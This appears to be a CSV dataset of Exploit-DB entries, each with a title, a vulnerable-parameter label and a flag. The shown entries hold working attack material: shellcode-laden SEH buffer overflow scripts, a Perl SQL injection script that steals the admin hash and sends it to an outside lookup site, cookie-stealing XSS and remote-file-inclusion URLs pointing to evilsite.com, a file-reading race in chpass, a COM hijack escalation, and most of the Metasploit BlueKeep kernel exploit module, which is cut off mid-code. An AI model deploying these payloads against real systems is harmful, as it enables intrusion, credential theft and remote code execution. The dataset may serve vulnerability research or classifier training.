22210,"OpenBSD 2.x/3.x - CHPass Temporary File Link File Content Revealing source: https://www.securityfocus.com/bid/6748/info  It has been reported that a problem with chpass included with OpenBSD may allow local users to gain access to the content of specific files. This vulnerability requires that lines in the target file be constructed in a specific format. This problem also affects the chfn and chsh programs which are hard links to the chpass binary.  # echo ""shell: secret_data"" >/tmp/sec # chmod 600 /tmp/sec $ chpass # ^Z in the editor [1]+ Stopped chpass $ rm /var/tmp/pw.Loi22925 $ ln /tmp/sec /var/tmp/pw.Loi22925 $ fg # then quit the editor chpass chpass: secret_data: non-standard shell",['CHPass'],0
48055,"MyVideoConverter Pro 3.14 - 'Output Folder' Buffer Overflow #Exploit Title: MyVideoConverter Pro 3.14 - 'Output Folder' Buffer Overflow #Exploit Author : ZwX #Exploit Date: 2020-02-11 #Vendor Homepage : http://www.ivideogo.com/ #Tested on OS: Windows 10 v1803 #Social: twitter.com/ZwX2a   ## Steps to Reproduce: ## #1. Run the python exploit script, it will create a new file with the name ""exploit.txt"". #2. Just copy the text inside ""exploit.txt"". #3. Start the program. In the new window click ""Options"" > ""Settins"" . #4. Now paste the content of ""exploit.txt"" into the field: ""Output Folder"" > Click ""..."" #5. The calculator runs successfully   #!/usr/bin/python   from struct import pack  buffer = ""\x41"" * 268 nseh = ""\xeb\x06\xff\xff"" seh = pack(""<I"",0x10045ebb) #0x10045ebb : pop edi # pop ebx # ret | {PAGE_EXECUTE_READ} [mysubtitle.dll] #ASLR: False, Rebase: False, SafeSEH: False, OS: False, v1.0.0.1 (C:\Program Files\MyVideoConverter Pro\mysubtitle.dll) shellcode =  """" shellcode += ""\xdb\xce\xbf\x90\x28\x2f\x09\xd9\x74\x24\xf4\x5d\x29"" shellcode += ""\xc9\xb1\x31\x31\x7d\x18\x83\xc5\x04\x03\x7d\x84\xca"" shellcode += ""\xda\xf5\x4c\x88\x25\x06\x8c\xed\xac\xe3\xbd\x2d\xca"" shellcode += ""\x60\xed\x9d\x98\x25\x01\x55\xcc\xdd\x92\x1b\xd9\xd2"" shellcode += ""\x13\x91\x3f\xdc\xa4\x8a\x7c\x7f\x26\xd1\x50\x5f\x17"" shellcode += ""\x1a\xa5\x9e\x50\x47\x44\xf2\x09\x03\xfb\xe3\x3e\x59"" shellcode += ""\xc0\x88\x0c\x4f\x40\x6c\xc4\x6e\x61\x23\x5f\x29\xa1"" shellcode += ""\xc5\x8c\x41\xe8\xdd\xd1\x6c\xa2\x56\x21\x1a\x35\xbf"" shellcode += ""\x78\xe3\x9a\xfe\xb5\x16\xe2\xc7\x71\xc9\x91\x31\x82"" shellcode += ""\x74\xa2\x85\xf9\xa2\x27\x1e\x59\x20\x9f\xfa\x58\xe5"" shellcode += ""\x46\x88\x56\x42\x0c\xd6\x7a\x55\xc1\x6c\x86\xde\xe4"" shellcode += ""\xa2\x0f\xa4\xc2\x66\x54\x7e\x6a\x3e\x30\xd1\x93\x20"" shellcode += ""\x9b\x8e\x31\x2a\x31\xda\x4b\x71\x5f\x1d\xd9\x0f\x2d"" shellcode += ""\x1d\xe1\x0f\x01\x76\xd0\x84\xce\x01\xed\x4e\xab\xee"" shellcode += ""\x0f\x5b\xc1\x86\x89\x0e\x68\xcb\x29\xe5\xae\xf2\xa9"" shellcode += ""\x0c\x4e\x01\xb1\x64\x4b\x4d\x75\x94\x21\xde\x10\x9a"" shellcode += ""\x96\xdf\x30\xf9\x79\x4c\xd8\xd0\x1c\xf4\x7b\x2d""  payload = buffer + nseh + seh + shellcode try:     f=open(""exploit.txt"",""w"")     print ""[+] Creating %s bytes evil payload.."" %len(payload)     f.write(payload)     f.close()     print ""[+] File created!"" except:     print ""File cannot be created""","[""'Output Folder'""]",1
32045,"eSyndiCat 2.2 - 'register.php' Multiple Cross-Site Scripting Vulnerabilities source: https://www.securityfocus.com/bid/30178/info  eSyndiCat is prone to multiple cross-site scripting vulnerabilities because it fails to sufficiently sanitize user-supplied data.  An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.  eSyndiCat Pro 2.2 is vulnerable; other versions may also be affected.   http://www.example.com/register.php where username=""><script>alert(12157312.477)</script>&email=""><script>alert(12157312.477)</script>&password=""><script>alert(12157312.477)</script>&password2=""><script>alert(12157312.477)</script>&security_code=""><script>alert(12157312.477)</script>&register=""><script>alert(12157312.477)</script>","[""'register.php'""]",1
33113,"PG Roommate Finder Solution - 'viewprofile.php?part' Cross-Site Scripting source: https://www.securityfocus.com/bid/35814/info   PG Roommate Finder Solution is prone to a cross-site scripting vulnerability because it fails to properly sanitize user-supplied input.   An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.   http://www.example.com/roommate/demo/viewprofile.php?part=""><script>alert(document.cookie);</script>","[""'viewprofile.php?part'""]",1
28166,"LifeType 1.0.5 - 'index.php?Date' SQL Injection source: https://www.securityfocus.com/bid/18835/info  LifeType is prone to an SQL-injection vulnerability. This issue is due to a failure in the application to properly sanitize user-supplied input before using it in an SQL query.   A successful exploit could allow an attacker to compromise the application, access or modify data, or exploit vulnerabilities in the underlying database implementation.  Version 1.0.5 is vulnerable to this issue; other versions may also be affected.  #!/usr/bin/perl -w # LifeType 1.0.5 SQL injection exploit (extract admin username and MD5 password) # Sun Jul  2 02:19:33 CEST 2006 # # Bug was found by Alejandro Ramos <aramosf *@* unsec.net>. # Script by Pedro Andujar <pandujar *@* selfdefense.es> and Alex. # # Shoutz: !dSR (www.digitalsec.net) and 514-77 (www.514.es) ppl. # # Example: # lifesucks.pl www.rs-labs.com blog # [~] LifeType 1.0.5 SQL injection exploit # [~] Sending string to http://www.rs-labs.com/blog/ # [*] The username for admin account is: romansoft # [*] The password MD5 of admin account is: 30df196559f6c591e936d7873119f5c9 # [*] The MD5 lookup for this hash is: roman123  use strict; use LWP::Simple;  if (@ARGV != 2) {     print "" LifeType 1.0.5 SQL injection exploit \n"";     print "" Usage: $0 <host> <path> \n"";     exit 1; } my $host = $ARGV[0]; my $path = $ARGV[1];  print ""[~] LifeType 1.0.5 SQL injection exploit \n""; print ""[~] Sending string to http://$host/$path/ \n""; my $ans_user = get ""http://$host/$path/index.php?op=Default&Date=0'%20UNION%20SELECT%201,user,1,1,1,1,1,1,1,1%20FROM%20lt_users%20WHERE%20id='1'/*&blogId=0"" || 0; my $ans_hash = get ""http://$host/$path/index.php?op=Default&Date=0'%20UNION%20SELECT%201,password,1,1,1,1,1,1,1,1%20FROM%20lt_users%20WHERE%20id='1'/*&blogId=0"";  if ($ans_user =~ m/Trackbacks&articleId=(\w*)/) {     print ""[*] The username for admin account is: $1 \n""; } if ($ans_hash =~ m/Trackbacks&articleId=(\w*)/) {     print ""[*] The password MD5 for admin account is: $1 \n""; } else {        die ""[-] Exploit failed. \n""; }  my $ans_pass = get ""http://www.digitalsec.es/md5.php?h=$1"" || 0;  if ($ans_pass =~ m#<br /><b>(.*?)</b># )  {        print ""[*] The MD5 lookup for this hash is: $1 \n""; } else {     die ""[-] Error, Impossible to lookup the MD5 password. \n""; }","[""'index.php?Date'""]",1
34484,"Joomla! Component com_dirfrm - Multiple SQL Injections source: https://www.securityfocus.com/bid/42512/info  The 'com_dirfrm' component for Joomla! is prone to multiple SQL-injection vulnerabilities because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.  Exploiting these issues could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.   http://www.example.com/path/index.php?option=com_dirfrm&task=listAll&catid=[SQL Injection]&id=8&Itemid=32  http://www.example.com/path/index.php?option=com_dirfrm&task=listAll&catid=1&id=[SQL Injection]&Itemid=32","['com_dirfrm', ""'com_dirfrm' component""]",1
29221,BlueSocket BSC 2100 5.0/5.1 - Admin.pl Cross-Site Scripting source: https://www.securityfocus.com/bid/21419/info  BlueSocket BSC 2100 is prone to a cross-site scripting vulnerability because it fails to properly sanitize user-supplied input.   An attacker may leverage this issue to have arbitrary script code execute in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.  This issue affects versions prior to 5.2 and versions without the 5.1.1-BluePatch fix.  https://www.example.com/admin.pl?ad_name=%22%3E%3Ch1%3EXSS%20BUG%3C/h1%3E%3C!--,['Admin.pl'],1
35648,ZenPhoto 1.4.0.3 - '_zp_themeroot' Multiple Cross-Site Scripting Vulnerabilities source: https://www.securityfocus.com/bid/47528/info  Zenphoto is prone to multiple cross-site scripting vulnerabilities because it fails to sufficiently sanitize user-supplied data.  An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.  Zenphoto 1.4.0.3 is vulnerable; other versions may also be affected.   http://www.example.com/themes/zenpage/slideshow.php?_zp_themeroot=%22%3E%3Cscript%3Ealert%28%22XSS%22%29;%3C/script%3E  http://www.example.com/themes/stopdesign/comment_form.php?_zp_themeroot=%22%3E%3Cscript%3Ealert%28%22XSS%22%29;%3C/script%3E,"[""'_zp_themeroot'""]",1
8066,"YACS CMS 8.11 - 'update_trailer.php' Remote File Inclusion               -----------------[remote file include]-----------------  script: YACS version 8.11     ------------------------------------------------------------------  download from: http://www.yetanothercommunitysystem.com/file-fetch/814-20081130-yacs-8.11rc30.zip      ============================================== vul: /yacs/scripts/update_trailer.php line 21 23 25;   include_once $context['path_to_root'].'shared/safe.php'; 21 if(!class_exists('i18n'))  include_once $context['path_to_root'].'i18n/i18n.php'; 23 if(!class_exists('SQL')) include_once $context['path_to_root'].'shared/sql.php'; 25    ==============================================  dork: ""Powered by yacs"" ----------------------------------------------  xpl:  http://127.0.0.1/path/yacs/scripts/update_trailer.php?context[path_to_root]=[shell.txt?]  http://127.0.0.1/yacs/scripts/update_trailer.php?context[path_to_root]=[shell.txt?]  *************************************************** *************************************************** --------------------------------------------------- Author: ahmadbady  [kivi_hacker666@yahoo.com]  from[iran] ---------------------------------------------------  # milw0rm.com [2009-02-16]","[""'update_trailer.php'""]",1
35258,WordPress Plugin Audio 0.5.1 - 'showfile' Cross-Site Scripting source: https://www.securityfocus.com/bid/45991/info  The Audio plugin for WordPress is prone to a cross-site scripting vulnerability because it fails to properly sanitize user-supplied input.  An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.  Audio plugin 0.5.1 is vulnerable; other versions may also be affected.   http://www.example.com/wordpress/wp-content/plugins/audio/getid3/demos/demo.browse.php?showfile=%3Cscript%3Ealert(0)%3C/script%3E,"[""'showfile'""]",1
46601,"VMware Workstation 14.1.5 / VMware Player 15 - Host VMX Process COM Class Hijack Privilege Escalation VMware: Host VMX Process COM Class Hijack EoP Platform: VMware Workstation Windows v14.1.5 (on Windows 10). Also tested VMware Player 15. Class: Elevation of Privilege  Summary: COM classes used by the VMX process on a Windows host can be hijacked leading to elevation of privilege.  Description: The VMX process (vmware-vmx.exe) process configures and hosts an instance of VM. As is common with desktop virtualization platforms the VM host usually has privileged access into the OS such as mapping physical memory which represents a security risk. To mitigate this the VMX process is created with an elevated integrity level by the authentication daemon (vmware-authd.exe) which runs at SYSTEM. This prevents a non-administrator user opening the process and abusing its elevated access.  Unfortunately the process is created as the desktop user which results in the elevated process sharing resources such as COM registrations with the normal user who can modify the registry to force an arbitrary DLL to be loaded into the VMX process.   The COM classes observed to be loaded by the VMX process, and thus can be hijacked by modifying the registry  are as follows:  1b1cad8c-2dab-11d2-b604-00104b703efd Microsoft WBEM (non)Standard Marshaling for IEnumWbemClassObject 7c857801-7381-11cf-884d-00aa004b2e24 PSFactoryBuffer 8bc3f05e-d86b-11d0-a075-00c04fb68820 Windows Management and Instrumentation bcde0395-e52f-467c-8e3d-c4579291692e MMDeviceEnumerator class cb8555cc-9128-11d1-ad9b-00c04fd8fdff WbemAdministrativeLocator Class d68af00a-29cb-43fa-8504-ce99a996d9ea Microsoft WBEM (non)Standard Marshaling for IWbemServices e7d35cfa-348b-485e-b524-252725d697ca PSFactoryBuffer  The majority of these are related to WMI and are probably not critical so could be removed, however MMDeviceEnumerator is used to find audio devices which is probably important. Also note that hijacking COM classes isn’t necessarily the only resource which could be hijacked. From a fixing perspective I don't know of any documented way of preventing the lookup of COM classes from HKEY_CURRENT_USER other than running the process as an administrator, about all you can do is not use COM at all. As with the other bug I’ve reported at the same time a more comprehensive fix would probably to not create the process as the desktop user, instead using another user identity, however that in itself has risks.  Proof of Concept:  I’ve provided a PoC as a C++ project.   1) Compile the project, make sure to compile the x64 version of the DLL otherwise the PoC will fail. 2) Copy the compiled HijackDll.dll to the folder c:\hijack.  3) Install the hijack.reg file using REGEDIT or the command line REG tool. This setups up a hijack of the CB8555CC-9128-11D1-AD9B-00C04FD8FDFF class.  4) Start a VMX instance using the normal GUI or vmrun.  Expected Result: The system COM class is loaded into the VMX.  Observed Result: The VMX process loads the hijack DLL into memory and a dialog box appears proving the code injection.   Proof of Concept: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/46601.zip",['VMX Process COM Class'],1
44155,"EChat Server 3.1 - 'CHAT.ghp' Buffer Overflow # Exploit Author: Juan Sacco <jsacco@exploitpack.com> # Vulnerability found using Exploit Pack v10 - http://exploitpack.com # # Impact: # An attacker could exploit this vulnerability to execute arbitrary code in the # context of the application. Failed exploit attempts will result in adenial-of-service condition. # # Program description: # Easy Chat Server is a easy, fast and affordable way to host and manage your own real-time communication software, # it allows friends/colleagues to chat with you through a Web Browser (IE, Safari, Chrome, Opera etc.) # Vendor page: http://www.echatserver.com/  import string, sys import socket, httplib import struct  def exploit():   try:     junk = '\x41' * 217     shortjmp = ""\xeb\x08\xcc\xcc"" # Jump over SEH     seh = struct.pack('<L', 0x100154c5) # ADD ESP,2C # POP ESI # ADD ESP,0C # RETN    ** [SSLEAY32.dll] **   |   {PAGE_EXECUTE_READ}     buffersize = 2775     nops = ""\x90""     # debug = ""\xcc\xcc\xcc\xcc""     shellcode = (""\xbb\xc7\x16\xe0\xde\xda\xcc\xd9\x74\x24\xf4\x58\x2b\xc9\xb1""                  ""\x33\x83\xc0\x04\x31\x58\x0e\x03\x9f\x18\x02\x2b\xe3\xcd\x4b""                  ""\xd4\x1b\x0e\x2c\x5c\xfe\x3f\x7e\x3a\x8b\x12\x4e\x48\xd9\x9e""                  ""\x25\x1c\xc9\x15\x4b\x89\xfe\x9e\xe6\xef\x31\x1e\xc7\x2f\x9d""                  ""\xdc\x49\xcc\xdf\x30\xaa\xed\x10\x45\xab\x2a\x4c\xa6\xf9\xe3""                  ""\x1b\x15\xee\x80\x59\xa6\x0f\x47\xd6\x96\x77\xe2\x28\x62\xc2""                  ""\xed\x78\xdb\x59\xa5\x60\x57\x05\x16\x91\xb4\x55\x6a\xd8\xb1""                  ""\xae\x18\xdb\x13\xff\xe1\xea\x5b\xac\xdf\xc3\x51\xac\x18\xe3""                  ""\x89\xdb\x52\x10\x37\xdc\xa0\x6b\xe3\x69\x35\xcb\x60\xc9\x9d""                  ""\xea\xa5\x8c\x56\xe0\x02\xda\x31\xe4\x95\x0f\x4a\x10\x1d\xae""                  ""\x9d\x91\x65\x95\x39\xfa\x3e\xb4\x18\xa6\x91\xc9\x7b\x0e\x4d""                  ""\x6c\xf7\xbc\x9a\x16\x5a\xaa\x5d\x9a\xe0\x93\x5e\xa4\xea\xb3""                  ""\x36\x95\x61\x5c\x40\x2a\xa0\x19\xbe\x60\xe9\x0b\x57\x2d\x7b""                  ""\x0e\x3a\xce\x51\x4c\x43\x4d\x50\x2c\xb0\x4d\x11\x29\xfc\xc9""                  ""\xc9\x43\x6d\xbc\xed\xf0\x8e\x95\x8d\x97\x1c\x75\x7c\x32\xa5""                  ""\x1c\x80"")     buffer = junk + shortjmp + seh + nops * (buffersize - (len(shellcode))) + shellcode     print buffer     URL = '/chat.ghp?username=' + buffer + '&password=null&room=1&null=2'     conn = httplib.HTTPConnection(host, port)     conn.request('GET', URL)     conn.close()   except Exception as Error:     print ""[!] Something went wrong!""     print Error  def howtousage():   print ""[!] Sorry, minimum required arguments: [host] [port]""   sys.exit(-1)  if __name__ == '__main__':   print ""[*] EChat Server v3.1 CHAT.ghp (UserName)""   print ""[*] Author: Juan Sacco <jsacco@exploitpack>""    try:     host = sys.argv[1]     port = sys.argv[2]   except IndexError:     howtousage() exploit()","[""'CHAT.ghp'""]",1
1861,Redaxo 3.2 - 'INCLUDE_PATH' Remote File Inclusion Script: Redaxo CMS Vendor: http://www.redaxo.de Discovered: beford <xbefordx gmail com>  Redaxo 3.2 - 3.1 - 3.0  ./redaxo/include/addons/image_resize/pages/index.inc.php?REX[INCLUDE_PATH]=attacker  Redaxo 3.0  ./redaxo3_0_demos_patched/redaxo/include/addons/image_resize/pages/index.inc.php?subpage=relations&REX[INCLUDE_PATH]=attacker ./redaxo3_0_demos_patched/redaxo/include/addons/simple_user/pages/index.inc.php?REX[INCLUDE_PATH]=attacker ./redaxo3_0_demos_patched/redaxo/include/addons/stats/pages/index.inc.php?REX[INCLUDE_PATH]=attacker  Redaxo 2.7.4  ./redaxo/include/addons/import_export/pages/index.inc.php?REX[INCLUDE_PATH]=attacker ./redaxo/include/pages/community.inc.php?subpage=newsletter&REX[INCLUDE_PATH]=attacker  # milw0rm.com [2006-06-02],"[""'INCLUDE_PATH'""]",1
2439,Newswriter SW 1.42 - 'editfunc.inc.php' File Inclusion #============================================================================================== #Newswriter SW <= 1.42 (NWCONF_SYSTEM[server_path]) Remote File Inclusion Vulnerability #=============================================================================================== # #Critical Level : Dangerous # #Script Dowload : http://www.baumedia.net/typo3conf/ext/nf_downloads/pi1/passdownload.php?downloaddata=3 # #Version : 1.42 # #================================================================================================ # #Bug in : # #include/editfunc.inc.php #================================================================================================ # #Vulnerable Code : # # #         include($NWCONF_SYSTEM['server_path'].'include/javascript.inc'.$NWCONF_SYSTEM['php_ext']); #         require($NWCONF_SYSTEM['server_path'].'include/text-out.inc'.$NWCONF_SYSTEM['php_ext']); #         require($NWCONF_SYSTEM['server_path'].'include/images.inc'.$NWCONF_SYSTEM['php_ext']); #         require($NWCONF_SYSTEM['server_path'].'include/filefunc.inc'.$NWCONF_SYSTEM['php_ext']); # #================================================================================================ # #Exploit : #-------------------------------- # #http://sitename.com/[Newswriter_SW_DIR]/include/editfunc.inc.php?NWCONF_SYSTEM[server_path]=http://evilsite.com/evilscript.txt? # # #================================================================================================ #Discoverd By : Silahsiz Kuvvetler # # #Conatact : co-type[at]hotmail[dot]com # #GreetZ : FaTTaLGazI- Narcotic - 0xyGen # #Special Thanqs : www.fatalerror.us #==================================================================================================  # milw0rm.com [2006-09-27],"[""'editfunc.inc.php'""]",1
34988,PHPShop 2.1 EE - 'name_new' Cross-Site Scripting source: https://www.securityfocus.com/bid/44763/info  PHPShop is prone to a cross-site scripting vulnerability because it fails to sufficiently sanitize user-supplied data.  An attacker may leverage this issue to execute arbitrary HTML and script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.  PHPShop 2.1 EE is vulnerable; other versions may also be affected.   http://www.example.com/uploads/2010/PHPShop%20XSS.html,"[""'name_new'""]",1
47416,"Microsoft Windows - BlueKeep RDP Remote Windows Kernel Use After Free (Metasploit) ## # This module requires Metasploit: https://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ##  #  Exploitation and Caveats from zerosum0x0: # #    1. Register with channel MS_T120 (and others such as RDPDR/RDPSND) nominally. #    2. Perform a full RDP handshake, I like to wait for RDPDR handshake too (code in the .py) #    3. Free MS_T120 with the DisconnectProviderIndication message to MS_T120. #    4. RDP has chunked messages, so we use this to groom. #       a. Chunked messaging ONLY works properly when sent to RDPSND/MS_T120. #       b. However, on 7+, MS_T120 will not work and you have to use RDPSND. #           i. RDPSND only works when #              HKLM\SYSTEM\CurrentControlSet\Control\TerminalServer\Winstations\RDP-Tcp\fDisableCam = 0 #           ii. This registry key is not a default setting for server 2008 R2. #              We should use alternate groom channels or at least detect the #              channel in advance. #    5. Use chunked grooming to fit new data in the freed channel, account for #       the allocation header size (like 0x38 I think?). At offset 0x100? is where #       the ""call [rax]"" gadget will get its pointer from. #       a. The NonPagedPool (NPP) starts at a fixed address on XP-7 #           i. Hot-swap memory is another problem because, with certain VMWare and #           Hyper-V setups, the OS allocates a buncha PTE stuff before the NPP #           start. This can be anywhere from 100 mb to gigabytes of offset #           before the NPP start. #       b. Set offset 0x100 to NPPStart+SizeOfGroomInMB #       c. Groom chunk the shellcode, at *(NPPStart+SizeOfGroomInMB) you need #          [NPPStart+SizeOfGroomInMB+8...payload]... because ""call [rax]"" is an #          indirect call #       d. We are limited to 0x400 payloads by channel chunk max size. My #          current shellcode is a twin shellcode with eggfinders. I spam the #          kernel payload and user payload, and if user payload is called first it #          will egghunt for the kernel payload. #    6. After channel hole is filled and the NPP is spammed up with shellcode, #       trigger the free by closing the socket. # #    TODO: #    * Detect OS specifics / obtain memory leak to determine NPP start address. #    * Write the XP/2003 portions grooming MS_T120. #    * Detect if RDPSND grooming is working or not? #    * Expand channels besides RDPSND/MS_T120 for grooming. #        See https://unit42.paloaltonetworks.com/exploitation-of-windows-cve-2019-0708-bluekeep-three-ways-to-write-data-into-the-kernel-with-rdp-pdu/ # #    https://github.com/0xeb-bp/bluekeep .. this repo has code for grooming #    MS_T120 on XP... should be same process as the RDPSND  class MetasploitModule < Msf::Exploit::Remote    Rank = ManualRanking    USERMODE_EGG = 0xb00dac0fefe31337   KERNELMODE_EGG = 0xb00dac0fefe42069    CHUNK_SIZE = 0x400   HEADER_SIZE = 0x48    include Msf::Exploit::Remote::RDP   include Msf::Exploit::Remote::CheckScanner    def initialize(info = {})     super(update_info(info,       'Name'           => 'CVE-2019-0708 BlueKeep RDP Remote Windows Kernel Use After Free',       'Description'    => %q(         The RDP termdd.sys driver improperly handles binds to internal-only channel MS_T120,         allowing a malformed Disconnect Provider Indication message to cause use-after-free.         With a controllable data/size remote nonpaged pool spray, an indirect call gadget of         the freed channel is used to achieve arbitrary code execution.       ),       'Author' =>       [         'Sean Dillon <sean.dillon@risksense.com>',  # @zerosum0x0 - Original exploit         'Ryan Hanson',                              # @ryHanson - Original exploit         'OJ Reeves <oj@beyondbinary.io>',           # @TheColonial - Metasploit module         'Brent Cook <bcook@rapid7.com>',            # @busterbcook - Assembly whisperer       ],       'License' => MSF_LICENSE,       'References' =>         [           ['CVE', '2019-0708'],           ['URL', 'https://github.com/zerosum0x0/CVE-2019-0708'],         ],       'DefaultOptions' =>         {           'EXITFUNC' => 'thread',           'WfsDelay' => 5,           'RDP_CLIENT_NAME' => 'ethdev',           'CheckScanner' => 'auxiliary/scanner/rdp/cve_2019_0708_bluekeep'         },       'Privileged' => true,       'Payload' =>         {           'Space' => CHUNK_SIZE - HEADER_SIZE,           'EncoderType' => Msf::Encoder::Type::Raw,         },       'Platform' => 'win',       'Targets' =>         [           [             'Automatic targeting via fingerprinting',             {               'Arch' => [ARCH_X64],               'FingerprintOnly' => true             },           ],           #           #           # Windows 2008 R2 requires the following registry change from default:           #           # [HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Terminal Server\WinStations\rdpwd]           # ""fDisableCam""=dword:00000000           #           [             'Windows 7 SP1 / 2008 R2 (6.1.7601 x64)',             {               'Platform' => 'win',               'Arch' => [ARCH_X64],               'GROOMBASE' => 0xfffffa8003800000,               'GROOMSIZE' => 100             }           ],           [             # This works with Virtualbox 6             'Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - Virtualbox 6)',             {               'Platform' => 'win',               'Arch' => [ARCH_X64],               'GROOMBASE' => 0xfffffa8002407000             }           ],           [             # This address works on VMWare 14             'Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - VMWare 14)',             {               'Platform' => 'win',               'Arch' => [ARCH_X64],               'GROOMBASE' => 0xfffffa8030c00000             }           ],           [             # This address works on VMWare 15             'Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - VMWare 15)',             {               'Platform' => 'win',               'Arch' => [ARCH_X64],               'GROOMBASE' => 0xfffffa8018C00000             }           ],           [             # This address works on VMWare 15.1             'Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - VMWare 15.1)',             {               'Platform' => 'win',               'Arch' => [ARCH_X64],               'GROOMBASE' => 0xfffffa8018c08000             }           ],           [             'Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - Hyper-V)',             {               'Platform' => 'win',               'Arch' => [ARCH_X64],               'GROOMBASE' => 0xfffffa8102407000             }           ],           [             'Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - AWS)',             {               'Platform' => 'win',               'Arch' => [ARCH_X64],               'GROOMBASE' => 0xfffffa8018c08000             }           ],         ],       'DefaultTarget' => 0,       'DisclosureDate' => 'May 14 2019',       'Notes' =>         {           'AKA' => ['Bluekeep']         }     ))      register_advanced_options(       [         OptBool.new('ForceExploit', [false, 'Override check result', false]),         OptInt.new('GROOMSIZE', [true, 'Size of the groom in MB', 250]),         OptEnum.new('GROOMCHANNEL', [true, 'Channel to use for grooming', 'RDPSND', ['RDPSND', 'MS_T120']]),         OptInt.new('GROOMCHANNELCOUNT', [true, 'Number of channels to groom', 1]),       ]     )   end    def exploit     unless check == CheckCode::Vulnerable || datastore['ForceExploit']       fail_with(Failure::NotVulnerable, 'Set ForceExploit to override')     end      if target['FingerprintOnly']       fail_with(Msf::Module::Failure::BadConfig, 'Set the most appropriate target manually')     end      begin       rdp_connect     rescue ::Errno::ETIMEDOUT, Rex::HostUnreachable, Rex::ConnectionTimeout, Rex::ConnectionRefused, ::Timeout::Error, ::EOFError       fail_with(Msf::Module::Failure::Unreachable, 'Unable to connect to RDP service')     end      is_rdp, server_selected_proto = rdp_check_protocol     unless is_rdp       fail_with(Msf::Module::Failure::Unreachable, 'Unable to connect to RDP service')     end      # We don't currently support NLA in the mixin or the exploit. However, if we have valid creds, NLA shouldn't stop us     # from exploiting the target.     if [RDPConstants::PROTOCOL_HYBRID, RDPConstants::PROTOCOL_HYBRID_EX].include?(server_selected_proto)       fail_with(Msf::Module::Failure::BadConfig, 'Server requires NLA (CredSSP) security which mitigates this vulnerability.')     end      chans = [       ['rdpdr', RDPConstants::CHAN_INITIALIZED | RDPConstants::CHAN_ENCRYPT_RDP | RDPConstants::CHAN_COMPRESS_RDP],       [datastore['GROOMCHANNEL'], RDPConstants::CHAN_INITIALIZED | RDPConstants::CHAN_ENCRYPT_RDP],       [datastore['GROOMCHANNEL'], RDPConstants::CHAN_INITIALIZED | RDPConstants::CHAN_ENCRYPT_RDP],       ['MS_XXX0', RDPConstants::CHAN_INITIALIZED | RDPConstants::CHAN_ENCRYPT_RDP | RDPConstants::CHAN_COMPRESS_RDP | RDPConstants::CHAN_SHOW_PROTOCOL],       ['MS_XXX1', RDPConstants::CHAN_INITIALIZED | RDPConstants::CHAN_ENCRYPT_RDP | RDPConstants::CHAN_COMPRESS_RDP | RDPConstants::CHAN_SHOW_PROTOCOL],       ['MS_XXX2', RDPConstants::CHAN_INITIALIZED | RDPConstants::CHAN_ENCRYPT_RDP | RDPConstants::CHAN_COMPRESS_RDP | RDPConstants::CHAN_SHOW_PROTOCOL],       ['MS_XXX3', RDPConstants::CHAN_INITIALIZED | RDPConstants::CHAN_ENCRYPT_RDP | RDPConstants::CHAN_COMPRESS_RDP | RDPConstants::CHAN_SHOW_PROTOCOL],       ['MS_XXX4', RDPConstants::CHAN_INITIALIZED | RDPConstants::CHAN_ENCRYPT_RDP | RDPConstants::CHAN_COMPRESS_RDP | RDPConstants::CHAN_SHOW_PROTOCOL],       ['MS_XXX5', RDPConstants::CHAN_INITIALIZED | RDPConstants::CHAN_ENCRYPT_RDP | RDPConstants::CHAN_COMPRESS_RDP | RDPConstants::CHAN_SHOW_PROTOCOL],       ['MS_T120', RDPConstants::CHAN_INITIALIZED | RDPConstants::CHAN_ENCRYPT_RDP | RDPConstants::CHAN_COMPRESS_RDP | RDPConstants::CHAN_SHOW_PROTOCOL],     ]      @mst120_chan_id = 1004 + chans.length - 1      unless rdp_negotiate_security(chans, server_selected_proto)       fail_with(Msf::Module::Failure::Unknown, 'Negotiation of security failed.')     end      rdp_establish_session      rdp_dispatch_loop   end  private    # This function is invoked when the PAKID_CORE_CLIENTID_CONFIRM message is   # received on a channel, and this is when we need to kick off our exploit.   def rdp_on_core_client_id_confirm(pkt, user, chan_id, flags, data)     # We have to do the default behaviour first.     super(pkt, user, chan_id, flags, data)      groom_size = datastore['GROOMSIZE']     pool_addr = target['GROOMBASE'] + (CHUNK_SIZE * 1024 * groom_size)     groom_chan_count = datastore['GROOMCHANNELCOUNT']      payloads = create_payloads(pool_addr)      print_status(""Using CHUNK grooming strategy. Size #{groom_size}MB, target address 0x#{pool_addr.to_s(16)}, Channel count #{groom_chan_count}."")      target_channel_id = chan_id + 1      spray_buffer = create_exploit_channel_buffer(pool_addr)     spray_channel = rdp_create_channel_msg(self.rdp_user_id, target_channel_id, spray_buffer, 0, 0xFFFFFFF)     free_trigger = spray_channel * 20 + create_free_trigger(self.rdp_user_id, @mst120_chan_id) + spray_channel * 80      print_status(""Surfing channels ..."")     rdp_send(spray_channel * 1024)     rdp_send(free_trigger)      chan_surf_size = 0x421     spray_packets = (chan_surf_size / spray_channel.length) + [1, chan_surf_size % spray_channel.length].min     chan_surf_packet = spray_channel * spray_packets     chan_surf_count  = chan_surf_size / spray_packets      chan_surf_count.times do       rdp_send(chan_surf_packet)     end      print_status(""Lobbing eggs ..."")      groom_mb = groom_size * 1024 / payloads.length      groom_mb.times do       tpkts = ''       for c in 0..groom_chan_count         payloads.each do |p|           tpkts += 